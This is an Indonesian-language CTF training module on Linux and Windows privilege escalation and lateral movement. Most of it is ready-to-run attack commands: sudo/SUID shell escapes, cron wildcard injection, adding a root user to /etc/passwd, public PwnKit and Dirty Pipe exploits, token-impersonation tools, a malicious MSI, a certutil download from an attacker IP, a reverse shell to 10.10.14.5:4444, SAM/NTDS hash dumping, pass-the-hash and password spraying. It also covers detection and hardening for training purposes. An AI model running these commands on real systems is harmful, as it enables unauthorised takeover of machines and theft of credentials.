# 3. Vertical & Horizontal Privilege Escalation

> Privilege Escalation adalah fase terakhir rantai Boot2Root: setelah dapat *foothold* (akses awal sebagai user terbatas), penyerang menaikkan hak akses sampai **menguasai mesin penuh** — `root` di Linux atau `SYSTEM`/`Administrator` di Windows. Ada dua arah: **vertical** (naik level, mis. `www-data` → `root`) dan **horizontal** (pindah ke akun setara, mis. user `alice` → user `bob`, untuk meraih credential atau akses berkas baru yang jadi batu loncatan). Teknik andalan di CTF LKSN 2026: **Living-Off-The-Land** — menyalahgunakan binary sah yang sudah ada di sistem (**GTFOBins** di Linux, **LOLBAS** di Windows) ditambah misconfig SUID/sudo, service, dan token. Tujuan akhir tetap: baca `root.txt`/`proof.txt`.

## Konsep

PrivEsc bukan satu *exploit* tunggal, melainkan **eksploitasi kepercayaan yang berlebihan**: sistem menjalankan sesuatu dengan hak lebih tinggi daripada yang seharusnya bisa dikendalikan user biasa. Penyerang mencari titik di mana ia bisa menyisipkan kode/perintah ke dalam konteks ber-privilege tersebut.

- **Vertical (privilege elevation)** — naik dari hak rendah ke hak tinggi: `user` → `root`/`SYSTEM`. Inilah yang biasanya membuka flag `root.txt`.
- **Horizontal (lateral)** — pindah ke akun **selevel** untuk mendapat data, credential, atau permukaan baru. Sering jadi *stepping stone*: `alice` → `bob` (yang ternyata anggota `sudo`/`Administrators`) → `root`/`SYSTEM`.

**Living-Off-The-Land (LotL)** adalah filosofi "hidup dari yang sudah ada di tanah ini": alih-alih membawa malware, penyerang memakai **binary bawaan yang ditandatangani & dipercaya** (`find`, `tar`, `python`, `vim` di Linux; `certutil`, `msiexec`, `rundll32` di Windows). Karena binary-nya sah, teknik ini **mengelak AV/EDR** dan memanfaatkan privilege yang melekat pada binary itu. Katalognya: **GTFOBins** (Unix) dan **LOLBAS** (Windows).

## Cara Kerja

Mekanisme yang disalahgunakan berbeda per-OS:

**Linux**

| Vektor | Akar masalah |
|---|---|
| **SUID/SGID binary** | Binary berjalan dengan euid pemilik (`root`); jika ada di GTFOBins → spawn shell ber-root |
| **sudo misconfig** | Entri `NOPASSWD`/wildcard/`secure_path` longgar memberi command ber-root |
| **Linux capabilities** | `cap_setuid`, `cap_dac_read_search` dll. memberi sebagian privilege root tanpa SUID |
| **Cron / scheduled job** | Skrip yang dijalankan `root` tapi **writable** user, atau memakai PATH/**wildcard** relatif (mis. `tar *`) |
| **PATH hijacking** | Skrip ber-privilege memanggil binary tanpa path absolut |
| **NFS `no_root_squash`** | Export NFS membiarkan UID `0` remote tetap root → tulis SUID-root dari mesin attacker, eksekusi sebagai user lokal |
| **Grup berbahaya (docker/lxd/disk)** | Keanggotaan grup tertentu setara root: mount `/` host atau buat kontainer privileged |
| **Writable `/etc/passwd`, kernel/local exploit** | Jalur langsung ke root jika file sensitif writable, atau exploit bernama (PwnKit, Baron Samedit, Dirty Pipe) |

**Windows**

| Vektor | Akar masalah |
|---|---|
| **Token impersonation** | `SeImpersonatePrivilege` memungkinkan "Potato" (PrintSpoofer/GodPotato) mencuri token `SYSTEM` |
| **Backup/Restore privilege** | `SeBackupPrivilege` membaca file apa pun (dump SAM/SYSTEM/NTDS); `SeRestorePrivilege` menimpa file/ACL sistem |
| **Service misconfig** | Binary service writable, ACL service longgar (`SERVICE_CHANGE_CONFIG`), atau **unquoted service path** |
| **AlwaysInstallElevated** | Registry mengizinkan instalasi `.msi` apa pun berjalan sebagai `SYSTEM` |
| **DLL hijacking** | Proses ber-privilege memuat DLL dari folder writable |
| **Stored credentials** | Password di registry/Autologon/`cmdkey`, file unattend, `runas /savecred` |
| **UAC bypass** | Naik dari medium → high integrity dalam konteks admin |

## Indikator / Cara Mengenali

Sinyal bahwa sebuah host punya jalur eskalasi:

- `sudo -l` menampilkan entri `(ALL) NOPASSWD:` atau binary yang ada di GTFOBins.
- `find / -perm -4000` menemukan SUID **tidak standar** (mis. `find`, `python`, `nmap`, `cp` ber-SUID).
- `getcap -r /` menemukan capability seperti `cap_setuid+ep` pada interpreter.
- `id`/`groups` menunjukkan user anggota **`docker`**, **`lxd`/`lxc`**, atau **`disk`** → setara root tanpa exploit.
- `cat /etc/exports` di target (atau `showmount -e` dari attacker) memuat export ber-**`no_root_squash`** → jalur SUID lewat NFS.
- `uname -a`/`/etc/os-release` menampilkan kernel/sudo/polkit **lawas** → cocokkan ke exploit bernama (PwnKit, Baron Samedit, Dirty Pipe).
- Di Windows, `whoami /priv` menampilkan **`SeImpersonatePrivilege`**, **`SeBackupPrivilege`**, atau `SeRestorePrivilege` dalam status *Enabled*.
- `sc qc <svc>` menunjukkan `BINARY_PATH_NAME` tanpa tanda kutip padahal mengandung spasi (*unquoted path*), atau folder binary-nya writable.
- Credential berserakan: `.bash_history`, file `config`/`.env`, `web.config`, `unattend.xml`, key `id_rsa` di home user lain.
- `linpeas`/`winpeas` menyorot temuan dengan warna **merah/kuning** (highlight = kemungkinan tinggi).

## Langkah Eksploitasi

1. **Stabilkan shell.** Upgrade ke TTY penuh (`python3 -c 'import pty;pty.spawn("/bin/bash")'`, lalu `Ctrl-Z` → `stty raw -echo; fg`) agar `sudo`/interaktif jalan.
2. **Enumerasi konteks.** Linux: `id`, `sudo -l`, `find / -perm -4000 2>/dev/null`, `getcap -r / 2>/dev/null`, cek cron (`cat /etc/crontab`, jalankan `pspy`). Windows: `whoami /priv`, `whoami /groups`, `systeminfo`.
3. **Otomasi enumerasi.** Jalankan `linpeas.sh`/`winPEAS.exe` (atau `PowerUp.ps1 → Invoke-AllChecks`) untuk memetakan semua vektor sekaligus.
4. **Cocokkan ke katalog.** Setiap SUID/sudo binary → cek **GTFOBins**; setiap LOLBin Windows → cek **LOLBAS**. Cari resep "shell/SUID/sudo".
5. **Pivot horizontal bila perlu.** Pakai credential yang ditemukan: `su - bob`, `ssh -i key bob@host`, atau `runas`/`RunasCs.exe` di Windows untuk menempati akun yang lebih kaya privilege.
6. **Eksekusi vektor vertical.** Spawn shell ber-`root`/`SYSTEM` lewat resep yang cocok (lihat *Contoh / Payload*).
7. **Verifikasi & ambil flag.** `id` → `uid=0`, atau `whoami` → `nt authority\system`; baca `root.txt`/`proof.txt`.

## Tools

| Tool | Fungsi singkat |
|---|---|
| **linPEAS / winPEAS** | Enumerasi PrivEsc otomatis lintas vektor (Linux/Windows), highlight temuan |
| **GTFOBins** | Katalog resep abuse binary Unix (SUID/sudo/capabilities/shell) |
| **LOLBAS** | Katalog binary/skrip/library sah Windows untuk download/exec/bypass |
| **pspy** | Pantau proses & cron tanpa root → tangkap job ber-privilege |
| **PowerUp.ps1 / SharpUp / Seatbelt** | Audit misconfig Windows (service, AlwaysInstallElevated, unquoted path) |
| **PrintSpoofer / GodPotato / RoguePotato** | Abuse `SeImpersonatePrivilege` → token `SYSTEM` |
| **BloodHound** | Petakan jalur eskalasi/lateral di Active Directory |
| **linux-exploit-suggester / Metasploit `local_exploit_suggester`** | Saran kernel/local exploit dari versi target |
| **PwnKit / Baron Samedit / Dirty Pipe PoC** | Exploit lokal bernama (polkit pkexec / sudo / kernel) bila semua misconfig buntu |
| **mimikatz / LaZagne / keepassxc-cli** | Dump/scrape credential & buka `.kdbx` KeePass (Windows/Linux) untuk pivot horizontal |
| **netexec / evil-winrm / impacket-secretsdump** | Pass-the-Hash & Pass-the-Ticket (`-H`/`-hashes`/`-k`) + dump SAM/NTDS lintas host |

## Contoh / Payload

```bash
# ── LINUX: enumerasi cepat ──────────────────────────────
id; sudo -l
find / -perm -4000 -type f 2>/dev/null      # daftar SUID
getcap -r / 2>/dev/null                       # capabilities

# ── sudo NOPASSWD pada binary GTFOBins → root ───────────
sudo find . -exec /bin/sh \; -quit            # sudo find diizinkan
sudo vim -c ':!/bin/sh'                        # sudo vim
sudo env /bin/sh                               # sudo env
# (sudo less /etc/profile → ketik  !/bin/sh )

# ── SUID binary → root (perhatikan -p agar euid dipertahankan) ──
./find . -exec /bin/sh -p \; -quit            # /usr/bin/find ber-SUID

# ── Linux capability cap_setuid pada python ─────────────
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'

# ── PATH hijack pada cron/SUID yang panggil binary relatif ──
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /tmp/backup
chmod +x /tmp/backup; export PATH=/tmp:$PATH   # jika skrip root memanggil `backup`

# ── Pivot HORIZONTAL: reuse credential / key ────────────
su - bob                                       # password reuse dari config/.env
ssh -i /home/bob/.ssh/id_rsa bob@127.0.0.1     # private key user lain
```

```powershell
# ── WINDOWS: enumerasi privilege & misconfig ────────────
whoami /priv
whoami /groups
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

# ── Token abuse: SeImpersonatePrivilege → SYSTEM ────────
PrintSpoofer64.exe -i -c cmd.exe               # spawn cmd sebagai SYSTEM
GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators bob /add"

# ── Service abuse: binPath bisa diubah (SERVICE_CHANGE_CONFIG) ──
sc qc DodgySvc                                  # cek konfigurasi service
sc config DodgySvc binPath= "cmd /c net localgroup administrators bob /add"
sc stop DodgySvc & sc start DodgySvc            # picu eksekusi sebagai LocalSystem

# ── AlwaysInstallElevated → MSI sebagai SYSTEM ──────────
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# (keduanya harus 0x1) → buat MSI di mesin attacker:
#   msfvenom -p windows/x64/exec CMD='net localgroup administrators bob /add' -f msi -o evil.msi
msiexec /quiet /qn /i C:\Temp\evil.msi

# ── LOLBAS: download tool tanpa bawa binary sendiri ─────
certutil -urlcache -split -f http://10.10.14.5/nc.exe C:\Temp\nc.exe

# ── Pivot HORIZONTAL dengan credential temuan ───────────
RunasCs.exe bob 'Passw0rd!' "cmd.exe" -r 10.10.14.5:4444
```

### Linux: NFS no_root_squash → SUID root

Tiga syarat yang wajib terpenuhi: (1) Anda **root di mesin attacker** yang mem-mount; (2) binary yang ditaruh harus berakhir **milik root + ber-bit SUID**; (3) user biasa di **target** menjalankannya dengan `-p`.

```bash
# Dari attacker (cek dulu flag export):
showmount -e 10.10.10.10                       # → /srv/share *(rw,no_root_squash)
mkdir -p /mnt/nfs && mount -o rw,vers=3 10.10.10.10:/srv/share /mnt/nfs

# Sebagai ROOT di attacker — karena no_root_squash, UID 0 attacker = UID 0 di server,
# jadi file tersimpan root-owned + SUID di sisi target.
cp /bin/bash /mnt/nfs/rootbash                 # CATATAN ARSITEKTUR: bash attacker harus cocok arch target;
                                               # jika ragu, di TARGET: cp /bin/bash /srv/share/rootbash,
                                               # lalu dari attacker hanya set owner/izin di bawah.
chown root:root /mnt/nfs/rootbash
chmod 4755 /mnt/nfs/rootbash                   # set bit SUID (rwsr-xr-x)

# Di TARGET, sebagai user biasa — -p mempertahankan euid root:
/srv/share/rootbash -p
id                                             # → euid=0(root) → cat /root/root.txt
```

### Linux: cron wildcard injection & writable `/etc/passwd`

```bash
# (a) Wildcard injection — cron root menjalankan glob, mis:  * * * * * root cd /opt/backup && tar czf /tmp/b.tgz *
# tar memperlakukan nama file sebagai argumen → selipkan opsi --checkpoint-action.
cd /opt/backup
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > runme.sh && chmod +x runme.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh runme.sh'
# tunggu cron berjalan → /tmp/rb SUID root; lalu:  /tmp/rb -p
# (varian: rsync via filename '-e sh runme.sh'; chown/chmod yang memakai wildcard)

# (b) Writable /etc/passwd — sisipkan baris user UID 0 dengan password yang kita kontrol.
H=$(openssl passwd -1 -salt xx 'pass123')               # → $1$xx$....  (hash MD5-crypt)
echo "hacker:$H:0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker                                                # password: pass123 → uid=0(root)
```

### Linux: grup berbahaya (docker / lxd)

```bash
# Grup `docker` = root: bind / host ke kontainer lalu chroot.
docker run -v /:/mnt --rm -it alpine chroot /mnt sh       # → root di host; /mnt = / host

# Grup `lxd`/`lxc`: kontainer privileged dengan / host di-bind.
lxc image import ./alpine.tar.gz --alias privesc          # image kecil via lxd-alpine-builder
lxc init privesc r00t -c security.privileged=true
lxc config device add r00t hostroot disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh                                     # di dalam: cat /mnt/root/root.txt (root host)
```

### Linux: local exploit bernama (cadangan bila misconfig buntu)

Selalu **fingerprint dulu** (`uname -r`, `sudo --version`, `ls -l /usr/bin/pkexec`) dan utamakan misconfig — exploit ini hanya saat tidak ada jalur lebih andal. Perhatikan **kategori yang benar**:

```bash
# ── USERLAND (abuse SUID-binary), BUKAN kernel ──
# PwnKit / CVE-2021-4034 — memory corruption di polkit pkexec (SUID root).
git clone https://github.com/berdav/CVE-2021-4034 && cd CVE-2021-4034 && make && ./cve-2021-4034
#   alternatif single-file: arthepsy/CVE-2021-4034 (cve-2021-4034-poc.c) → gcc → ./a.out → # id

# Baron Samedit / CVE-2021-3156 — heap overflow di sudo/sudoedit.
#   Rentan: sudo 1.8.2–1.8.31p2 & 1.9.0–1.9.5p1 (fixed 1.9.5p2).
#   Uji cepat tanpa crash:  sudoedit -s '\' → "malformed input" = RENTAN; "usage:" = patched.
git clone https://github.com/blasty/CVE-2021-3156 && cd CVE-2021-3156 && make && ./sudo-hax-me-a-sandwich

# ── KERNEL ──
# Dirty Pipe / CVE-2022-0847 — kernel 5.8 s/d <5.16.11 / <5.15.25 / <5.10.102.
#   Timpa file read-only (/etc/passwd) atau hijack SUID → root.
./dirtypipe /usr/bin/su          # AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits (exploit-2: SUID hijack)
# DirtyCOW / CVE-2016-5195 — kernel <4.8.3 (race copy-on-write); andalan box lawas.
```

### Windows: SeBackupPrivilege → dump SAM/SYSTEM → secretsdump

`whoami /priv` menampilkan `SeBackupPrivilege: Enabled` (lazim pada grup **Backup Operators**). `reg save` menghormati privilege backup sehingga **mengabaikan ACL** file hive.

```powershell
# 1) Salin hive sensitif (ACL di-bypass oleh SeBackupPrivilege)
reg save hklm\sam    C:\Temp\sam.hive
reg save hklm\system C:\Temp\system.hive
# 2) Exfil 2 file ke attacker (evil-winrm `download` / SMB), lalu ekstrak NTLM offline:
#    impacket-secretsdump -sam sam.hive -system system.hive LOCAL
#    → Administrator:500:aad3b435...:32196b56ffe6f45e294117b91a83bf38:::
# 3) Pakai hash: pass-the-hash (lihat bawah) atau crack `hashcat -m 1000`.

# ── Di DOMAIN CONTROLLER: dump NTDS.dit via shadow copy (diskshadow mem-bypass lock) ──
@'
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
exec cmd.exe /c (copy z:\windows\ntds\ntds.dit C:\Temp\ntds.dit)
delete shadows volume %raj%
reset
'@ | Out-File -Encoding ascii C:\Temp\ds.txt
diskshadow /s C:\Temp\ds.txt
reg save hklm\system C:\Temp\system.hive
impacket-secretsdump -ntds C:\Temp\ntds.dit -system C:\Temp\system.hive LOCAL   # dump SEMUA hash domain
# (alternatif: robocopy /b utk file ber-SeBackup; SeRestorePrivilege → timpa file sistem mis. utilman.exe)
```

### Horizontal movement & Pass-the-Hash / Pass-the-Ticket

```bash
# (1) Temukan credential — lokasi paling sering:
grep -rinE 'pass(word)?|secret|api[_-]?key' /var/www /home /opt 2>/dev/null
cat ~/.bash_history ~/.mysql_history 2>/dev/null         # perintah lampau sering bocorkan password
find / \( -name '*.env' -o -name 'config.php' -o -name 'web.config' \) 2>/dev/null   # connstr/secret app
cat /home/*/.ssh/id_rsa 2>/dev/null                      # private key user lain
find / -name '*.kdbx' 2>/dev/null                        # KeePass → keepass2john *.kdbx | hashcat -m 13400, lalu keepassxc-cli

# (2) Reuse lintas user/host
su - bob                                                 # password reuse dari config/.env
ssh -i /home/bob/.ssh/id_rsa bob@127.0.0.1               # key user lain
netexec smb 10.10.10.0/24 -u bob -p 'Reused!' --continue-on-success   # spraying lintas host
```

```powershell
# (3) Pass-the-Hash (NTLM) — login tanpa plaintext, cukup NT-hash
evil-winrm -i 10.10.10.5 -u administrator -H 32196b56ffe6f45e294117b91a83bf38
netexec smb 10.10.10.5 -u administrator -H 32196b56ffe6f45e294117b91a83bf38 --sam   # validasi + dump SAM
impacket-psexec administrator@10.10.10.5 -hashes :32196b56ffe6f45e294117b91a83bf38

# (3') Pass-the-Ticket (Kerberos) — pakai .ccache (TGT/TGS), bukan hash
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain.local/administrator@dc.domain.local
evil-winrm -i dc.domain.local -u administrator -r DOMAIN.LOCAL     # -r realm → autentikasi Kerberos
```

> **Catatan penting.** "Potato" (PrintSpoofer/GodPotato) hanya jalan jika `SeImpersonatePrivilege` *Enabled* — umum pada akun service (IIS `iis apppool\`, MSSQL). Flag `-p` pada `/bin/sh`/`/bin/bash` **wajib** agar euid root dari binary SUID tidak di-drop. Selalu **fingerprint versi OS/kernel** sebelum mengandalkan kernel exploit, dan utamakan misconfig (lebih andal, tak bikin crash) sebelum exploit memori.

## Deteksi & Mitigasi

**Perbaikan inti (hardening konfigurasi — fix yang sebenarnya, kaitan ke Modul C):**

- **Audit & minimalkan SUID/SGID** (Linux): `find / -perm -4000 -o -perm -2000` lalu cabut bit yang tak perlu (`chmod -s`), mount partisi data dengan `nosuid,noexec`. Ini langsung mematikan mayoritas resep GTFOBins.
- **Sudoers least privilege**: hindari `NOPASSWD` dan wildcard, set `Defaults secure_path` (memutus PATH hijack), jangan beri editor/interpreter/`find`/`tar` lewat sudo.
- **Kerasi export NFS** (lawan no_root_squash): pakai `root_squash`/`all_squash` + `nosuid` di `/etc/exports`, batasi ke host/subnet tertentu, dan jangan ekspos `2049` ke jaringan tak tepercaya. Cron yang memakai glob: quote argumen, prefiks `./`, dan akhiri opsi dengan `--`.
- **Batasi keanggotaan grup berisiko**: anggota `docker`/`lxd`/`disk` setara root — jangan beri ke user biasa; pisahkan host yang menjalankan Docker dari akun interaktif.
- **Windows service hygiene**: perbaiki *unquoted service path* (bungkus tanda kutip), perketat ACL service & folder binary (cek dengan `accesschk.exe -uwcqv`), jalankan service dengan akun ber-privilege minimum.
- **Matikan AlwaysInstallElevated** (set kedua key ke `0`), dan untuk akun service yang **harus** punya `SeImpersonatePrivilege`, **patch** host agar Potato (DCOM/RPC) tidak bisa relay token ke SYSTEM.
- **Batasi privilege backup**: jangan beri `SeBackupPrivilege`/`SeRestorePrivilege` atau grup **Backup Operators** ke akun non-admin — keduanya = baca/timpa file sistem apa pun (dump SAM/SYSTEM/NTDS). Audit anggota Backup Operators dan akses ke DC.
- **Anti credential-reuse (lawan horizontal)**: terapkan **LAPS** (password admin lokal unik per-host), rotasi credential, hapus secret dari `unattend.xml`/registry/history. Tutup jalur pivot `su`/`runas`.
- **Patch kernel & komponen** untuk menutup local exploit.

**Deteksi (blue-team — jembatan ke Modul C: Log Forensic & Logging/Auditing):**

- **Process-creation logging**: aktifkan **Sysmon Event ID 1** + Windows Event **4688** (command line), dan `auditd` (rule `execve`) di Linux. Cari **parent-child anomali** ciri LotL: `spoolsv.exe`/`svchost.exe` → `cmd.exe`, atau service `*.exe` men-spawn shell.
- **Tanda enumerasi**: eksekusi `linpeas`/`winpeas`, `whoami /priv`, lonjakan `sudo -l`, `find ... -perm -4000`.
- **Tanda abuse**: penambahan anggota grup admin lokal (**Event ID 4732**), `sc config ... binPath=`, `msiexec /i`, `certutil -urlcache`, eksekusi `.msi`/`rundll32` dengan argumen aneh.
- **File Integrity Monitoring** (AIDE/Sysmon) pada binary SUID, sudoers, dan service binary untuk menangkap perubahan.

## Mini-Lab

**Skenario A — Linux (vertical via GTFOBins).** Anda punya foothold sebagai `www-data`. Eskalasikan ke `root` dan baca `/root/root.txt`.

1. `sudo -l` → output: `(ALL) NOPASSWD: /usr/bin/find`.
2. Buka GTFOBins entri **find**, bagian *Sudo*.
3. Jalankan `sudo find . -exec /bin/sh \; -quit` → shell ber-`uid=0`.
4. `id` memastikan `root`, lalu `cat /root/root.txt` → **flag**.

**Skenario B — Windows (vertical via token abuse).** Foothold sebagai service account IIS. `whoami /priv` menunjukkan `SeImpersonatePrivilege` *Enabled*.

1. Upload `PrintSpoofer64.exe` (lewat LOLBAS `certutil`).
2. Jalankan `PrintSpoofer64.exe -i -c cmd.exe`.
3. Di shell baru: `whoami` → `nt authority\system`.
4. Baca `C:\Users\Administrator\Desktop\root.txt` → **flag**.

**Tantangan tambahan (horizontal):** sebelum eskalasi vertical, temukan password user lain di file `config`/`.env`, pivot dengan `su - <user>` atau `RunasCs.exe`, baru lanjut ke `root`/`SYSTEM`.

## Referensi & Latihan

- **GTFOBins** — katalog abuse binary Unix (SUID/sudo/cap/shell): https://gtfobins.github.io
- **LOLBAS** — katalog binary/skrip sah Windows (download/exec/bypass): https://lolbas-project.github.io
- **HackTricks** — *Linux Privilege Escalation* & *Windows Local Privilege Escalation* (checklist & teknik per-vektor).
- **PayloadsAllTheThings** — bagian *Linux/Windows - Privilege Escalation*.
- **HTB Academy** — modul *Linux Privilege Escalation* & *Windows Privilege Escalation*; mesin latihan klasik: *Lame*, *Optimum*, *Devel*, *Cronos*.
- **TryHackMe** — room *Linux PrivEsc*, *Windows PrivEsc*, *Common Linux Privesc*, *Vulnversity*.
- **pwn.college** — modul *Privilege Escalation* / sandbox & SUID untuk pemahaman dasar.
- **root-me** — kategori *App-System* (eskalasi & abuse binary).

> **Etika:** Hanya gunakan pada lab pribadi, platform latihan resmi, target CTF, atau sistem dengan izin tertulis. Mengeskalasi hak akses pada mesin tanpa izin adalah pelanggaran hukum.
